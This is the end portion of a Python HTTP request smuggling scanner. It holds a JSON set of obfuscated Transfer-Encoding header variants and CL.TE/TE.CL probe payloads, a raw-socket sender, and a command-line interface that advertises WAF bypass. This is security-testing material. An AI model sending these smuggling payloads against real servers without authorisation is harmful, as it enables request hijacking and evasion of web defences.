				"te_value": "chunked"
			}
		},
		{
			"type": "zdsuffix1",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "chunked\r"
			}
		},
		{
			"type": "zdsuffix2",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "chunked\t"
			}
		},
		{
			"type": "revdualchunk",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "identity\r\nTransfer-Encoding: chunked"
			}
		},
		{
			"type": "zdspam",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer\\r-Encoding: ",
				"te_value": "chunked"
			}
		},
		{
			"type": "bodysplit",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Foo: barn\n\nTransfer-Encoding: ",
				"te_value": "chunked"
			}
		},
		{
			"type": "nested",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding: ",
				"te_value": "cow chunked bar"
			}
		},
		{
			"type": "spaceFF",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:",
				"te_value": "\\xFFchunked"
			}
		},
		{
			"type": "unispace",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfer-Encoding:",
				"te_value": "\\xA0chunked"
			}
		},
		{
			"type": "accentTE",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transf\\x82r-Encoding:",
				"te_value": "chunked"
			}
		},
		{
			"type": "accentCH",
			"content_length_key": "Content-Length:",
			"transfer_encoding": {
				"te_key": "Transfr-Encoding: ",
				"te_value": "ch\\x96nked"
			}
		}
	],
	"detection": [
		{
			"type": "CL.TE",
			"payload": "\r\n1\r\nZ\r\nQ\r\n\r\n",
			"content_length": 5
		},
		{
			"type": "TE.CL",
			"payload": "\r\n0\r\n\r\n\r\nG",
			"content_length": 6
		}
	]
}
"""


def hrs_detection(_host, _port, _path, _method, permute_type, content_length_key,
                  te_key, te_value, smuggle_type, content_length, payload, _timeout):
    constants = Constants()
    headers = ''
    headers += '{} {} HTTP/1.1{}'.format(_method, _path, constants.crlf)
    headers += 'Host: {}{}'.format(_host, constants.crlf)
    headers += '{} {}{}'.format(content_length_key, content_length, constants.crlf)
    headers += '{}{}{}'.format(te_key, te_value, constants.crlf)
    smuggle_body = headers + payload

    permute_type = "[" + permute_type + "]"
    elapsed_time = "-"

    _style_space_config = "{:<30}{:<25}{:<25}{:<25}{:<25}"
    _style_permute_type = colored(permute_type, constants.cyan, attrs=['bold'])
    _style_smuggle_type = colored(smuggle_type, constants.magenta, attrs=['bold'])
    _style_status_code = colored("-", constants.blue, attrs=['bold'])
    _style_elapsed_time = "{}".format(colored(elapsed_time, constants.yellow, attrs=['bold']))
    _style_status = colored(constants.detecting, constants.green, attrs=['bold'])

    print(_style_space_config.format(_style_permute_type, _style_smuggle_type, _style_status_code,
                                     _style_elapsed_time, _style_status), end="\r", flush=True)

    start_time = time.time()

    try:
        connection = SocketConnection()
        connection.connect(_host, _port, _timeout)
        connection.send_payload(smuggle_body)

        response = connection.receive_data().decode("utf-8")
        end_time = time.time()

        if len(response.split()) > 0:
            status_code = response.split()[1]
        else:
            status_code = 'NO RESPONSE'
        _style_status_code = colored(status_code, constants.blue, attrs=['bold'])

        connection.close_connection()

        elapsed_time = str(round((end_time - start_time) % 60, 2)) + "s"
        _style_elapsed_time = "{}".format(colored(elapsed_time, constants.yellow, attrs=['bold']))

        is_hrs_found = connection.detect_hrs_vulnerability(start_time, _timeout)

        if is_hrs_found:
            _style_status = colored(constants.delayed_response_msg, constants.red, attrs=['bold'])
            _reports = constants.reports + '/{}/{}-{}{}'.format(_host, permute_type, smuggle_type, constants.extenstion)
            Utils.write_payload(_reports, smuggle_body)
        else:
            _style_status = colored(constants.ok, constants.green, attrs=['bold'])
    except Exception as exception:
        elapsed_time = str(round((time.time() - start_time) % 60, 2)) + "s"
        _style_elapsed_time = "{}".format(colored(elapsed_time, constants.yellow, attrs=['bold']))

        error = f'{constants.dis_connected} → {exception}'
        _style_status = colored(error, constants.red, attrs=['bold'])

    print(_style_space_config.format(_style_permute_type, _style_smuggle_type, _style_status_code,
                                     _style_elapsed_time, _style_status))

    time.sleep(1)


if __name__ == "__main__":
    if sys.version_info < (3, 0):
        print(Constants().python_version_error_msg)
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description='Enhanced HTTP Request Smuggling vulnerability detection tool v3.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python hrs_detector.py -u https://example.com -m POST -t 10 -r 2 --enhanced
  python hrs_detector.py -urls targets.txt -m POST -t 10 -r 2 --enhanced --concurrent --proxy http://proxy:8080
  python hrs_detector.py -u https://example.com -m POST -t 10 -r 2 --enhanced --cookies "session=abc123"
        """
    )
    parser.add_argument("-u", "--url", help="set the target url")
    parser.add_argument("-urls", "--urls", help="set list of target urls, i.e (urls.txt)")
    parser.add_argument("-t", "--timeout", help="set socket timeout, default - 10", default=10, type=int)
    parser.add_argument("-m", "--method", help="set HTTP Methods, i.e (GET or POST), default - POST", default="POST")
    parser.add_argument("-r", "--retry", help="set the retry count to re-execute the payload, default - 2", default=2, type=int)
    parser.add_argument("-e", "--enhanced", help="use enhanced detection with advanced features", action="store_true")
    parser.add_argument("-c", "--concurrent", help="enable concurrent scanning for multiple targets", action="store_true")
    parser.add_argument("-o", "--output", help="output directory for reports", default="reports")
    parser.add_argument("--proxy", help="HTTP proxy to use (e.g., http://proxy:8080)")
    parser.add_argument("--cookies", help="Cookies to include in requests (e.g., 'session=abc123')")
    parser.add_argument("--auth", help="Basic authentication (e.g., 'username:password')")
    parser.add_argument("--max-workers", help="Maximum concurrent workers for scanning", default=5, type=int)
    parser.add_argument("--no-ssl-verify", help="Disable SSL certificate verification", action="store_true")
    parser.add_argument("--debug", help="Enable debug mode", action="store_true")
    args = parser.parse_args()

    utils = Utils()
    constants = Constants()
    enhanced_detector = EnhancedHRSDetector()

    try:
        utils.print_header()
        print(colored("Enhanced HTTP Request Smuggling Detector v3.0", 'cyan', attrs=['bold']))
        print(colored("Features: Advanced payloads, Timing analysis, WAF bypass, Multi-threat detection, ML-based detection\n", 'yellow'))

        if args.debug:
            print(colored("[DEBUG] Debug mode enabled", 'yellow'))

        if args.urls and args.url:
            print(constants.invalid_url_options)
            sys.exit(1)

        target_urls = list()
        if args.urls:
            urls = utils.read_target_list(args.urls)
            if constants.file_not_found in urls:
                print(f"[{args.urls}] not found in your local directory")
                sys.exit(1)
            target_urls = urls

        if args.url:
            target_urls.append(args.url)

        method = args.method.upper() if args.method else "POST"
        pattern = re.compile('GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|TRACE')
        if not (pattern.match(method)):
            print(constants.invalid_method_type)
            sys.exit(1)

        timeout = args.timeout
        retry = args.retry

        if retry == 0:
            print(constants.invalid_retry_count)
            sys.exit(1)

        # Display configuration
        print(colored("[+] Configuration:", 'cyan', attrs=['bold']))
        print(f"    Method: {method}")
        print(f"    Timeout: {timeout}s")
        print(f"    Retry: {retry}")
        print(f"    Targets: {len(target_urls)}")
        if args.proxy:
            print(f"    Proxy: {args.proxy}")
        if args.cookies:
            print(f"    Cookies: {args.cookies[:30]}...")
        if args.auth:
            print(f"    Auth: {args.auth.split(':')[0]}:****")
        print()

        if args.enhanced and args.concurrent and len(target_urls) > 1:
            print(colored(f"\n[+] Running enhanced concurrent scan on {len(target_urls)} targets...", 'cyan', attrs=['bold']))
            
            # Prepare payloads
            payloads = enhanced_detector.payload_generator.cl_te_payloads + enhanced_detector.payload_generator.te_cl_payloads
            
            # Run concurrent scan
            scanner = ConcurrentScanner(max_workers=args.max_workers)
            results = scanner.scan_bulk(
                target_urls, method, timeout, retry, payloads,
                proxy=args.proxy, cookies=args.cookies, auth=args.auth
            )
            
            # Generate comprehensive report
            report_files = enhanced_detector.report_generator.generate_report(results, args.output)
            
            print(colored(f"\n[+] Scan complete!", 'green', attrs=['bold']))
            print(colored(f"[+] Reports saved to:", 'cyan'))
            for format_name, file_path in report_files.items():
                print(colored(f"    - {format_name}: {file_path}", 'yellow'))
            
            # Summary
            vulnerable = sum(1 for r in results.values() if r.get('vulnerable', False))
            total = len(results)
            errors = sum(1 for r in results.values() if r.get('error'))
            print(colored(f"\n[+] Summary: {vulnerable}/{total} targets vulnerable", 
                         'red' if vulnerable > 0 else 'green', attrs=['bold']))
            if errors > 0:
                print(colored(f"[!] {errors} targets had errors", 'yellow'))
            
        elif args.enhanced:
            print(colored("\n[+] Running enhanced scan with advanced features:", 'cyan', attrs=['bold']))
            features = [
                "    - Timing analysis with statistical baseline",
                "    - Advanced payload obfuscation (8 techniques)",
                "    - Response fingerprinting and analysis",
                "    - Multi-threat detection (6 threat types)",
                "    - WAF bypass techniques (6 methods)",
                "    - Machine learning-based detection",
                "    - HTTP/2 smuggling detection",
                "    - WebSocket smuggling detection",
                "    - Proxy and cookie support",
                "    - Comprehensive reporting (HTML, JSON, CSV, Markdown)"
            ]
            for feature in features:
                print(colored(feature, 'yellow'))
            print()
            
            for url in target_urls:
                enhanced_detector.run_enhanced_scan(
                    url, method, timeout, retry,
                    proxy=args.proxy, cookies=args.cookies, auth=args.auth
                )
        else:
            print(colored("\n[+] Running standard scan...", 'cyan', attrs=['bold']))
            
            for url in target_urls:
                result = utils.url_parser(url)
                try:
                    json_res = json.loads(result)
                    host = json_res['host']
                    port = json_res['port']
                    path = json_res['path']

                    if host is None:
                        print(f"Invalid host - {host}")
                        sys.exit(1)

                    square_left_sign = colored('[', constants.cyan, attrs=['bold'])
                    plus_sign = colored("+", constants.green, attrs=['bold'])
                    square_right_sign = colored(']', constants.cyan, attrs=['bold'])
                    square_sign = "{}{}{:<16}".format(square_left_sign, plus_sign, square_right_sign)

                    target_header_style_config = '{:<1}{}{:<25}{:<16}{:<10}'
                    print(target_header_style_config.format('', square_sign,
                                                            colored("Target URL", constants.magenta, attrs=['bold']),
                                                            colored(":", constants.magenta, attrs=['bold']),
                                                            colored(url, constants.blue, attrs=['bold'])))
                    print(target_header_style_config.format('', square_sign,
                                                            colored("Method", constants.magenta, attrs=['bold']),
                                                            colored(":", constants.magenta, attrs=['bold']),
                                                            colored(method, constants.blue, attrs=['bold'])))
                    print(target_header_style_config.format('', square_sign,
                                                            colored("Retry", constants.magenta, attrs=['bold']),
                                                            colored(":", constants.magenta, attrs=['bold']),
                                                            colored(retry, constants.blue, attrs=['bold'])))
                    print(target_header_style_config.format('', square_sign,
                                                            colored("Timeout", constants.magenta, attrs=['bold']),
                                                            colored(":", constants.magenta, attrs=['bold']),
                                                            colored(timeout, constants.blue, attrs=['bold'])))

                    if args.proxy:
                        print(target_header_style_config.format('', square_sign,
                                                                colored("Proxy", constants.magenta, attrs=['bold']),
                                                                colored(":", constants.magenta, attrs=['bold']),
                                                                colored(args.proxy, constants.blue, attrs=['bold'])))

                    reports = os.path.join(str(Path().absolute()), constants.reports, host)
                    print(target_header_style_config.format('', square_sign,
                                                            colored("HRS Reports", constants.magenta, attrs=['bold']),
                                                            colored(":", constants.magenta, attrs=['bold']),
                                                            colored(reports, constants.blue, attrs=['bold'])))
                    print()

                    data = json.loads(PAYLOADS_JSON)

                    for permute in data[constants.permute]:
                        for d in data[constants.detection]:
                            for _ in range(retry):
                                transfer_encoding_obj = permute[constants.transfer_encoding]
                                hrs_detection(host, port, path, method,
                                              permute[constants.type],
                                              permute[constants.content_length_key],
                                              transfer_encoding_obj[constants.te_key],
                                              transfer_encoding_obj[constants.te_value],
                                              d[constants.type],
                                              d[constants.content_length],
                                              d[constants.payload],
                                              timeout)
                except ValueError as _:
                    print(result)

    except KeyboardInterrupt:
        print(colored("\n[!] Scan interrupted by user", 'red', attrs=['bold']))
        print(colored("[+] Partial results may have been saved", 'yellow'))
    except Exception as e:
        print(colored(f"\n[!] Error: {e}", 'red', attrs=['bold']))
        if args.debug:
            import traceback
            traceback.print_exc()
